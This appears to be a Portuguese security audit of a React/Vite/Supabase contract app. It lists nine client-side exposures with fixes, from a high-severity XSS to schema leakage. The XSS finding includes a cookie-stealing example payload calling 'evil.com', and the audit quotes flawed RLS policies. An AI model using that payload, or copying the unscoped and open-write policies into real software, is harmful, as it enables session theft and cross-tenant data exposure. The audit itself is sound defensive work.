# Auditoria de Segurança — Exposição no Cliente

**Data:** 2026-04-07  
**Escopo:** Arquivos acessíveis no browser (JS bundle compilado pelo Vite)  
**Stack:** React + Vite + Supabase (SPA)

---

## Contexto arquitetural

Em uma SPA com Vite/React, **todo o código em `src/` é compilado, empacotado e servido ao browser**. Isso significa que qualquer pessoa com DevTools pode inspecionar o bundle e ler qualquer arquivo `.ts`/`.tsx`. Não existe "código privado" no frontend — a proteção real fica nas RLS policies do Supabase e nos endpoints de backend.

---

## 1. Vulnerabilidade Crítica — XSS via `dangerouslySetInnerHTML`

**Arquivo:** `src/pages/MasterReview.tsx` (linha 177)  
**Severidade:** Alta

```tsx
<div dangerouslySetInnerHTML={{ __html: document.generated_document }} />
```

O conteúdo de `generated_document` vem do banco, preenchido pelo usuário final. Se um usuário malicioso inserir HTML/JS no formulário (ex: `<script>fetch('evil.com?cookie='+document.cookie)</script>`), esse código é executado no browser do master que abre a revisão.

**Risco:** Sessão do master comprometida; acesso à organização e todos os contratos.

**Mitigação futura:** Sanitizar o HTML antes de renderizar (biblioteca `DOMPurify`), ou renderizar como texto puro (`whitespace-pre-wrap`).

---

## 2. Vulnerabilidade — RLS com falha de escopo (Masters × Organizações)

**Arquivo:** `supabase/migrations/20260330000000_contract_events.sql`  
**Severidade:** Média

A policy `contract_events_select_master` permite que qualquer usuário com role `master` leia eventos de **qualquer contrato**, sem filtrar pela organização:

```sql
CREATE POLICY "contract_events_select_master"
ON contract_events FOR SELECT
USING (
  EXISTS (
    SELECT 1
    FROM saved_contracts sc
    JOIN user_roles ur ON ur.user_id = auth.uid()
    WHERE sc.id = contract_events.contract_id
      AND ur.role = 'master'
    -- FALTA: AND sc.organization_id IN (SELECT id FROM organizations WHERE owner_user_id = auth.uid())
  )
);
```

**Risco:** Um master de qualquer organização consegue ler o histórico de eventos de contratos de outras organizações.

**Mitigação futura:** Adicionar filtro de `organization_id` à policy, igual ao padrão adotado nas outras policies de `saved_contracts`.

---

## 3. Schema completo do banco exposto no bundle

**Arquivo:** `src/integrations/supabase/types.ts`  
**Severidade:** Média (informação, não execução)

O arquivo gerado automaticamente pelo Supabase contém o **schema público completo**:

- Todas as tabelas: `contract_templates`, `organizations`, `party_types`, `profiles`, `saved_contracts`, `share_links`, `user_roles`, `contract_events`
- Todos os campos, tipos e nullability de cada coluna
- Todas as relações (foreign keys)
- Todos os enums (`app_role`: `admin`, `user`, `master`)
- Todas as funções RPC e seus parâmetros: `create_master_account`, `get_user_organization`, `get_user_role`, `has_role`, `is_master`, `promote_user_to_admin`, `validate_share_link`

**Risco:** Um atacante pode mapear a estrutura completa do banco sem precisar de acesso privilegiado. Isso facilita a engenharia de ataques dirigidos às RLS policies.

**Mitigação futura:** Mover types para um package privado de backend, ou usar um gateway de API que abstrai a estrutura do banco do cliente.

---

## 4. Funções administrativas expostas via bundle

**Arquivo:** `src/integrations/supabase/types.ts` (seção `Functions`)  
**Severidade:** Média

As funções `create_master_account` e `promote_user_to_admin` ficam visíveis no bundle com seus parâmetros. Embora sejam `SECURITY DEFINER` e não possam ser chamadas por usuários sem permissão, qualquer pessoa sabe que essas funções existem e como chamá-las via REST/Supabase client.

**Risco:** Vetor de ataque conhecido — tentativas de explorar falhas de configuração nessas funções.

**Mitigação futura:** Expor apenas as funções necessárias ao cliente via Edge Functions com autenticação própria.

---

## 5. Credenciais do Supabase no bundle

**Arquivo:** `.env` / bundle compilado  
**Severidade:** Baixa (design intencional do Supabase)

```
VITE_SUPABASE_URL="https://tyfmdlepdgjaglzdaqxr.supabase.co"
VITE_SUPABASE_PUBLISHABLE_KEY="eyJhbGci..."
VITE_SUPABASE_PROJECT_ID="tyfmdlepdgjaglzdaqxr"
```

A `anon key` (publishable key) é **projetada para ser pública** — a segurança real está nas RLS policies. Porém, o `PROJECT_ID` e a URL do projeto ficam expostos, permitindo a qualquer um:
- Fazer requisições diretas à API do Supabase autenticando como `anon`
- Chamar qualquer função RPC visível no bundle
- Consultar tabelas cujas RLS policies permitam leitura sem autenticação (ver item 6)

**Nota:** Isso não é um bug do projeto — é limitação estrutural de SPAs com Supabase. A proteção real deve estar nas RLS.

---

## 6. Tabelas com RLS permissiva demais (herança de migrations iniciais)

**Arquivo:** `supabase/migrations/20251018131604_*.sql` e `20251018145049_*.sql`  
**Severidade:** Baixa (foram corrigidas em migrations posteriores, mas o histórico indica risco de regressão)

As migrations iniciais criaram `contract_templates` e `party_types` com:
```sql
CREATE POLICY "Allow public write access" ON ... FOR ALL USING (true);
```

Foram corrigidas em migrations posteriores, mas o padrão indica que eventuais novas tabelas podem surgir com policies abertas demais.

---

## 7. Lógica de negócio exposta no bundle

**Arquivos:** `src/utils/conditionalLogic.ts`, `src/utils/documentGenerators.ts`, `src/utils/templateUtils.ts`, etc.  
**Severidade:** Baixa (informação competitiva, não risco de segurança direto)

Toda a lógica de:
- Avaliação de condições de campos (`evaluateCondition`, `evaluateConditionalLogic`)
- Geração de documentos
- Processamento de templates
- Regras de validação

...fica disponível no bundle para qualquer pessoa ler, copiar e reproduzir.

**Risco:** Propriedade intelectual do produto disponível para concorrentes sem autenticação.

**Mitigação futura:** Mover geração de documentos e processamento de templates para uma Edge Function/backend. O cliente envia os dados preenchidos e recebe o documento gerado — sem expor o algoritmo.

---

## 8. Roles e fluxo de autorização expostos

**Arquivo:** `src/contexts/AuthContext.tsx`  
**Severidade:** Baixa

A lógica de verificação de roles (`isAdmin`, `isMaster`) e o fluxo completo de autorização ficam visíveis. Um atacante sabe exatamente o que precisa para se passar por cada tipo de usuário e quais endpoints chamar.

---

## 9. `console.log` em código de produção

**Arquivo:** `src/utils/seedDefaultTemplates.ts`  
**Severidade:** Muito baixa

```ts
console.log('🌱 Iniciando seed de templates padrão...');
```

Expõe operações internas nos DevTools do browser.

---

## Resumo de prioridades

| # | Item | Severidade | Ação necessária |
|---|------|-----------|-----------------|
| 1 | XSS via `dangerouslySetInnerHTML` | **Alta** | Sanitizar com DOMPurify ou renderizar como texto |
| 2 | RLS `contract_events` sem filtro de org | **Média** | Corrigir policy com filtro de `organization_id` |
| 3 | Schema completo do banco no bundle | **Média** | Arquitetural — migrar para gateway/backend |
| 4 | Funções admin expostas no bundle | **Média** | Arquitetural — mover para Edge Functions |
| 5 | Credenciais no bundle | **Baixa** | Inerente à arquitetura; garantir RLS robustas |
| 6 | Histórico de RLS permissiva | **Baixa** | Auditar novas tabelas ao criar |
| 7 | Lógica de negócio no bundle | **Baixa** | Arquitetural — mover geração para backend |
| 8 | Fluxo de auth exposto | **Baixa** | Inerente à arquitetura SPA |
| 9 | `console.log` em produção | **Muito baixa** | Remover antes do deploy |

---

## Itens que NÃO são problemas

- **Anon key exposta**: design do Supabase — é pública por natureza
- **Nomes de rotas expostos** (`/master`, `/s/:token`): proteção via RLS e auth redirect, não por obscuridade
- **Queries ao Supabase no frontend**: padrão da arquitetura — a segurança é nas RLS policies

---

## Decisão arquitetural recomendada (longo prazo)

O item de maior impacto é criar uma camada de backend (Edge Functions ou API separada) responsável por:
1. Geração de documentos (remove lógica do bundle)
2. Funções administrativas (remove `create_master_account` e `promote_user_to_admin` do cliente)
3. Validação de dados antes de persistir (reduz dependência exclusiva de RLS)

Enquanto isso não acontece, a proteção real do sistema são as **RLS policies do Supabase** — que precisam ser auditadas periodicamente.
